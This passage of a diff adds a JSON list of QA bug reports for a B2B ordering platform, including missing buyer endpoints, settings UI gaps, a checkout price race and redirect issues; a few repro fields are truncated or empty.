+      "title": "GET /buyer/me returns 404: buyer self-profile endpoint missing",
+      "severity": "P1",
+      "surface": "web-buyer",
+      "repro": "Log in as buyer. | `GET /buyer/me` → | | `GET /buyer/profile` → 200 (works, but has different path than what components may expect).",
+      "expected": "`GET /buyer/me` returns the authenticated buyer's profile (business name, contact, address)."
+    },
+    {
+      "id": "RF-218",
+      "title": "No buyer home/dashboard page: portal lands directly on /orders",
+      "severity": "P1",
+      "surface": "mobile-buyer",
+      "repro": "Log in as buyer. | Observe landing page — orders list, no balance/dashboard.",
+      "expected": "Buyer portal home screen shows: outstanding balance, number of open orders, recent invoices summary, quick reorder from standing orders."
+    }
+  ],
+  "P2": [
+    {
+      "id": "RF-198",
+      "title": "Price-change-at-checkout race: buyer silently receives updated price with no warning",
+      "severity": "P2",
+      "surface": "web-buyer",
+      "repro": "Buyer adds Product X ($| 49) to cart. | Simultaneously, operator changes Product X price to $| | | Buyer submits checkout — order created at $| 99 with no warning.",
+      "expected": "The checkout API either (a) locks the price at add-to-cart time and alerts the buyer if it has changed before checkout, or (b) detects the price discrepancy server-side at order submission and returns"
+    },
+    {
+      "id": "RF-201",
+      "title": "Inventory adjustment UI reason not transmitted to API: movement notes always null",
+      "severity": "P3",
+      "surface": "web-op",
+      "repro": "Navigate to a product detail page. | Click \"Adjust Stock.\" | Select \"Damaged\" as the reason. | Enter a quantity and submit. | `GET /inventory/movements` — the new record shows `notes: null`.",
+      "expected": "The selected reason from the UI selector is included in the API payload as `notes` or `reason`. The resulting movement record shows the reason text in the audit log."
+    },
+    {
+      "id": "RF-202",
+      "title": "isOverdue=true for invoice due today: same-day grace boundary not documented",
+      "severity": "P3",
+      "surface": "api",
+      "repro": "Create an invoice with `dueDate = today`. | Send it. | `GET /invoices/:id` → `isOverdue: true`.",
+      "expected": "Business rule is documented and consistently applied. If same-day = still due, rule should be `dueDate < today`. If same-day = overdue, current behavior is correct but should be documented."
+    },
+    {
+      "id": "RF-206",
+      "title": "Route appears twice in Dispatch \"All routes\" list",
+      "severity": "P2",
+      "surface": "web-op",
+      "repro": "Navigate to `/dispatch`. | Open the \"All routes\" list. | A route with multiple runs appears twice in the list.",
+      "expected": "Each route appears exactly once in the dispatch route list."
+    },
+    {
+      "id": "RF-209",
+      "title": "Finance sub-routes return \"Unmatched Route\" 404: correct paths omit /finance/ prefix",
+      "severity": "P2",
+      "surface": "web-op",
+      "repro": "Navigate to `/finance/expenses`, `/finance/payments`, `/finance/dashboard`, `/bookkeeping`, or `/payments`. | \"Unmatched Route\" error page displayed.",
+      "expected": "Finance module sub-routes (`/finance/expenses`, `/finance/payments`, `/finance/dashboard`) render the appropriate screens, or redirect to the correct URL."
+    },
+    {
+      "id": "RF-214",
+      "title": "Settings Business Profile fields have no validation: ZIP accepts 4-digit, tax rate accepts negative/over-100",
+      "severity": "P2",
+      "surface": "web-op",
+      "repro": "",
+      "expected": ""
+    },
+    {
+      "id": "RF-219",
+      "title": "Buyer \"Total Spend\" shows $0 despite delivered orders",
+      "severity": "P2",
+      "surface": "web-buyer",
+      "repro": "Log in as Buyer 2 (has delivered orders). | Navigate to the \"More\" tab. | \"Total Spend\" displays $| ",
+      "expected": "\"Total Spend\" shows the sum of all completed order totals (or paid invoice amounts) for the buyer."
+    },
+    {
+      "id": "RF-221",
+      "title": "Mark Received button active on already-RECEIVED vendor bills",
+      "severity": "P2",
+      "surface": "web-op",
+      "repro": "Mark a vendor bill as Received. | Observe the \"Mark Received\" button remains visible.",
+      "expected": "\"Mark Received\" button is hidden or disabled (greyed out, not clickable) on bills with status=RECEIVED."
+    },
+    {
+      "id": "RF-222",
+      "title": "GET /analytics returns 404: analytics API root endpoint missing",
+      "severity": "P2",
+      "surface": "web-op",
+      "repro": "`GET /analytics` → | | `GET /analytics/revenue` → 200 (works).",
+      "expected": "`GET /analytics` returns either a summary of all analytics data or a 301/302 redirect to `/analytics/revenue`."
+    },
+    {
+      "id": "RF-223",
+      "title": "Vendor Bills filter tabs missing Partial and Void status filters",
+      "severity": "P3",
+      "surface": "web-op",
+      "repro": "Navigate to `/vendor-bills`. | Count the filter tab options — Partial and Void are not present.",
+      "expected": "Vendor Bills filter tabs include: All, Draft, Received, Partial, Paid, Void."
+    },
+    {
+      "id": "RF-224",
+      "title": "No \"Create Return\" button in operator Returns UI: operators cannot initiate returns from the web dashboard",
+      "severity": "P2",
+      "surface": "web-op",
+      "repro": "Log in as operator. | Navigate to `/returns`. | No \"Create Return\" or \"New Return\" button visible anywhere on the page.",
+      "expected": "The `/returns` list page has a prominent \"Create Return\" button that opens the return creation form."
+    },
+    {
+      "id": "RF-225",
+      "title": "Settings Notifications tab has no Send Test button and no per-channel or per-event preferences",
+      "severity": "P2",
+      "surface": "web-op",
+      "repro": "Log in as operator. | Navigate to `/settings` Notifications tab. | Observe only a global toggle — no test button or granular controls.",
+      "expected": "Settings Notifications shows: (1) a \"Send Test Notification\" button that sends a sample notification to the operator, (2) per-channel toggles (Email, Push, SMS), (3) per-event controls indicating whic"
+    },
+    {
+      "id": "RF-226",
+      "title": "Settings Business Profile tab shows tenant name and email as read-only static text: cannot be edited",
+      "severity": "P2",
+      "surface": "web-op",
+      "repro": "",
+      "expected": ""
+    },
+    {
+      "id": "RF-227",
+      "title": "Settings Invoicing tab missing invoice number prefix and payment due days fields",
+      "severity": "P2",
+      "surface": "web-op",
+      "repro": "Navigate to `/settings`. | Open the Invoicing section/tab. | Only one field (tax rate) is visible.",
+      "expected": "Settings Invoicing tab includes: Tax Rate, Invoice Number Prefix, Payment Due Days (Net terms)."
+    },
+    {
+      "id": "RF-228",
+      "title": "No concurrent session limit or suspicious-activity detection: unlimited parallel sessions per user",
+      "severity": "P2",
+      "surface": "web-buyer",
+      "repro": "Log in as operator in Browser A. | Log in as the same operator in Browser B, C, D — all sessions remain valid simultaneously. | No notification sent; no session limit enforced.",
+      "expected": "Either: (a) a session limit (e.g., max 3 concurrent sessions per account) with automatic invalidation of the oldest on new login, OR (b) an active sessions list in Settings allowing users to view and "
+    },
+    {
+      "id": "RF-229",
+      "title": "Scrolling down on buyer invoice detail triggers back navigation to Orders tab",
+      "severity": "P2",
+      "surface": "mobile-buyer",
+      "repro": "Log in as buyer. | Navigate to Invoices and tap any invoice to open detail. | Swipe/scroll down on the invoice detail page. | Page navigates back to Orders tab instead of scrolling.",
+      "expected": "Scrolling down on the invoice detail page scrolls the content. Navigation only occurs when the user explicitly taps a back button or navigates away."
+    },
+    {
+      "id": "RF-231",
+      "title": "Buyer portal deep links without active session redirect to marketing homepage instead of login page",
+      "severity": "P2",
+      "surface": "web-buyer",
+      "repro": "Open an incognito window (no buyer session). | Navigate directly to `/buyer/portal/[seller]/invoices/INV-2026-0016`. | App redirects to `/` instead of `/customer-login`.",
+      "expected": "Unauthenticated access to any buyer portal route redirects to `/customer-login?redirect=[original-path]`, so after login the buyer lands on the intended page."
+    },
+    {
+      "id": "RF-232",
+      "title": "No favorite/bookmark button on buyer product cards: favorites feature not implemented in buyer catalog",
+      "severity": "P2",
+      "surface": "mobile-buyer",
+      "repro": "Log in as any buyer. | Navigate to the catalog/shop. | Inspect product cards — no heart/favorite icon present.",
+      "expected": "Each product card in the buyer catalog has a heart/star icon. Tapping it toggles the product as a favorite. A \"Favorites\" tab or filter allows buyers to view and order from their saved products."
+    },
+    {
+      "id": "RF-233",
+      "title": "Buyer /profile page immediately redirects to /orders: buyer profile page inaccessible",
+      "severity": "P2",
+      "surface": "web-buyer",
+      "repro": "Log in as any buyer. | Navigate to `/profile` or the profile link in the buyer portal nav. | Page immediately redirects to `/orders`.",
+      "expected": "The buyer profile page renders with editable fields for name, email, phone, delivery address, and a \"Change Password\" option."
+    }
+  ]
+}
